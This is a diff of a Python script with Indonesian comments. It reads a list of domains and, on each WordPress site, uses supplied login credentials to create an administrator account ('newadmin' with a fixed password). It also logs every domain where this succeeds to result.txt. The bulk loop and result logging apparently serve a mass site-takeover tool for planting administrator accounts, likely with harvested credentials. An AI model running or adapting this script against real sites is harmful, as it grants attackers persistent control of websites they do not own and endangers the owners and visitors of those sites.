@@ -2,29 +2,31 @@ import sys
 import requests
 from requests.auth import HTTPBasicAuth
 
+# Fungsi untuk menambah admin
 def add_admin(domain, wp_user, wp_pass, new_user, new_pass, new_email):
-    try:
-        # URL endpoint REST API untuk menambah pengguna
-        url = f"http://{domain}/wp-json/wp/v2/users"
-        
-        # Data pengguna baru
-        user_data = {
-            "username": new_user,
-            "password": new_pass,
-            "email": new_email,
-            "roles": ["administrator"]
-        }
+    url = f"http://{domain}/wp-json/wp/v2/users"
+    user_data = {
+        "username": new_user,
+        "password": new_pass,
+        "email": new_email,
+        "roles": ["administrator"]
+    }
 
-        # Permintaan POST dengan autentikasi dasar
+    try:
+        # Kirim permintaan POST dengan autentikasi dasar
         response = requests.post(url, json=user_data, auth=HTTPBasicAuth(wp_user, wp_pass))
 
-        # Validasi hasil
+        # Cek status code dan output hasil
         if response.status_code == 201:
-            print(f"[SUCCESS] Admin user added to {domain}")
+            result = f"https://{domain}/ > berhasil add admin"
+            print(result)
+            # Simpan hasil berhasil ke dalam file
+            with open('result.txt', 'a') as file:
+                file.write(f"{domain} > berhasil add admin\n")
         else:
-            print(f"[FAILED] Could not add admin to {domain}: {response.text}")
+            print(f"https://{domain}/ > gagal add admin")
     except Exception as e:
-        print(f"[ERROR] {domain} - {str(e)}")
+        print(f"https://{domain}/ > gagal add admin")
 
 # Fungsi utama
 def main():
@@ -36,7 +38,7 @@ def main():
     with open(sys.argv[1], 'r') as file:
         domains = file.read().splitlines()
 
-    # Input data admin baru
+    # Data admin baru
     new_user = "newadmin"
     new_pass = "StrongPassword123!"
     new_email = "newadmin@example.com"
